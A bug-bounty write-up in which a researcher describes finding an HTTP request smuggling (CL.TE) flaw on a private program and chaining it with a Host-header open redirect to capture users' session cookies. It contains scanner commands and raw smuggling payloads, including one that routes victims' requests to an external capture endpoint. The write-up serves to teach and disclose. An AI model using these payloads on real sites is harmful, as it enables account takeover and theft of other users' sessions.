---
title: I owe your Request | HTTP Request Smuggling leads to Full Accounts takeover
author: Muhammad Adel
date: 2021-08-29 19:40:00 +0200
categories: [Bug Hunting]
tags: [bug hunting, web, http request smuggling, writeups]
---

## **Introduction**
Peace be upon you all, this is actually my first writeup which going to be about a very interesting vulnerability, HTTP Request Smuggling, which I found in a private program which I was able to escalate it Full account takeover. I am going to share with you how to search for this vulnerability in a large scale and what the best tool and resource to utilize when testing for this vulnerability.

It begins almost when the amazing researcher [James kettle](https://twitter.com/albinowax) announce his new research at DEFCON which address a new era of the HTTP request smuggling but this time for HTTP/2. I watched the video and I couldn't understand any thing, So I went back and studied the previous version of this attack and I thought what about testing this "rare attack" as some people think before moving to the new one. I ended up finding this critical vulnerability at two different private programs.

![](https://gblobscdn.gitbook.com/assets%2F-MR5KvOL_gXbwMWP6Z6m%2F-MiH8QkhdKu6BciITe6D%2F-MiHFxfVj0C3vf_kr-u0%2Ftwitter.png?alt=media&token=76b7e577-2df0-4f4c-96f1-c7624ad3a351)

## **About HTTP Request Smuggling**
HTTP request smuggling is an attack in which an attacker interferes with the processing of a sequence of HTTP requests that a web application receives from one or more users. Vulnerabilities related to HTTP request smuggling are often critical, allowing an attacker to bypass security measures, gain unauthorized access to sensitive data, and directly compromise the information of other users of the application.

I am not going to cover it here because Portswigger did really good job at explaining this with practical Labs.

[https://portswigger.net/web-security/request-smuggling](https://portswigger.net/web-security/request-smuggling)

## **Methodology**
After you had learned about the vulnerability you can start looking for it in some bug bounty programs. you have two methods but remember you need to test this with caution because it is very harmful:

1.Using HTTP Request Smuggling Burp Extension either burp community or pro. you can widen your scope by adding more subdomains and URLs select them all and from the extension tab click **smuggle probe.**

‌2\. Using [smuggler.py](https://github.com/defparam/smuggler) tool which is a command line tool that replicate almost the same work of burp extension.

```bash
# Single Host:
python3 smuggler.py -u <URL>

# List of hosts:
cat list_of_hosts.txt | python3 smuggler.py
```
‌Note: These scanner will not guarantee the existing of vulnerability, there are false positives so you need to validate every finding of any of these tools.
‌
## **The Finding**

Since it is a private program we are going to name it as `readcted.com`I started by collecting some subdomains then I feed all those subdomain to burp and started to crawl the website. Then I run burp extension scanner in all the subdomains. and after some time I found this issue at my target tab.

![](https://gblobscdn.gitbook.com/assets%2F-MR5KvOL_gXbwMWP6Z6m%2F-MiH8QkhdKu6BciITe6D%2F-MiHNT93loWWcwRV3sTA%2Fburp_issue.png?alt=media&token=4d18476c-72bc-4dcc-add0-d7de0ee221db)

It is a CT.TE Here, the front-end server uses the `Content-Length` header and the back-end server uses the `Transfer-Encoding` header. this information is very important to be able to exploit the vulnerability.

### **Validating**

I started now to validate if the vulnerability exits of its just a false positive. I send the following request:

‌

```
POST / HTTP/1.1 
Host: subdoamin.readcted.com
Upgrade-Insecure-Requests: 1 
Content-Type: application/x-www-form-urlencoded 
Content-Length: 7 
Transfer-Encoding: chunked 
Transfer-encoding: identity


1
A
0
```
which successfully triggers a connection time out indicating the backend server process the transfer encoding header. Now it is the time to exploit it.

### **Exploiting**

To exploit HTTP Request Smuggling Vulnerability you have to use turbo intruder to be able to send concurrent request and to receive the smuggled one before it reach the user. we will send the following request:

‌
```
POST / HTTP/1.1
Host: redacted.com
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 32
Transfer-Encoding: chunked
Transfer-encoding: identity

0

GET /video HTTP/1.1
Foo: x
```
We manged to send the smuggled request to **`/video`** to be able to disrupt the user experience by smuggle a not found web page. then we will chose **`smuggle attack CL.TE`** form the extension tab and then click attack.

![](https://gblobscdn.gitbook.com/assets%2F-MR5KvOL_gXbwMWP6Z6m%2F-MiH8QkhdKu6BciITe6D%2F-MiHTkc_PU7-cN6_EbLN%2Fnot_found%20turbo%20intuder.png?alt=media&token=53a10c8c-d248-4983-be21-a0cd2ba3c881)

Great! now we confirmed that the vulnerability exists and can disrupt the user experience who browse the website to redirect him to a not found page. but still we need to escalate this vulnerability to something else. as you know HTTP Request smuggling can lead to many vulnerabilities but still we need anther harmless vulnerability like Self XSS or Open redirection to be able to escalate our attack. I manged to search for Self XSS but unfortunately I didn't find. Let's search for an open redirected.

### **Harmless Open Redirect**

what we need to find is an open redirection to be able to redirect the user traffic with their own cookie to our server. we have found before a local redirection which is if the website isn't found it will make a redirection like the following:

![](https://gblobscdn.gitbook.com/assets%2F-MR5KvOL_gXbwMWP6Z6m%2F-MiMOdbd-AYVghO5XQ4x%2F-MiMRuFbfOUxn-gI7MvH%2Flocal%20redirection.png?alt=media&token=918b888e-cce1-42b6-9238-49b7f140fb67)

The problem is that the redirection is locally in the website and we need an external one. but what if change the host header to something else?!

![](https://gblobscdn.gitbook.com/assets%2F-MR5KvOL_gXbwMWP6Z6m%2F-MiMOdbd-AYVghO5XQ4x%2F-MiMSa2Vt5Cnx5F579av%2Fexternal%20redirection.png?alt=media&token=2673760a-394a-44ba-8339-6ac730428b47)

**BINGO!!** almost all the companies will not accept this vulnerability per se but by combining this with HTTP Request Smuggling we will do Magic!

### **Escalating to Full Account takeover**

Now let's craft our request that will be smuggled to send our malicious one. I will [request bin ](https://requestbin.com/)to receive users traffic into my endpoint. the payload shall looks like the following:
‌
```
POST / HTTP/1.1
Host: redacted.com
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 91
Transfer-Encoding: chunked
Transfer-encoding: identity

0

GET /video HTTP/1.1
Host: enfliy4kmrr8i.x.pipedream.net
Foo: x
```

and then pass our request to turbo intruder and start our attack:

![](https://gblobscdn.gitbook.com/assets%2F-MR5KvOL_gXbwMWP6Z6m%2F-MiMqTVoY0h_myvBGJ3h%2F-MiN12rU2wKYeV-0YdJu%2F1-turbo-intruder-redacted.png?alt=media&token=2cc95312-90cc-49ad-aee0-9016c56a0f11)

Okay, the attack worked now let's back to or endpoint to see what's happen.

![](https://gblobscdn.gitbook.com/assets%2F-MR5KvOL_gXbwMWP6Z6m%2F-MiMqTVoY0h_myvBGJ3h%2F-MiN2Uly_EoUyexj4Omh%2F3-Request%20bin%20--%20with%20Cookie-redacted.png?alt=media&token=2b599ba5-3516-45b1-914b-341164a2c1fc)

**BOOM!!** My endpoint is flooding with requests that contains cookie. Now, I can fully takeover any account who is browsing the website.


## **Conclusion**

I have reported this and they are working on a fix at the current moment. The sad story is that this report has been closed as duplicate but I was able to find the same technique on anther website and received 4 digit bounty as reward.

I hope you enjoyed reading this and if you have any question feel free to ping me any time, Happy Hunting!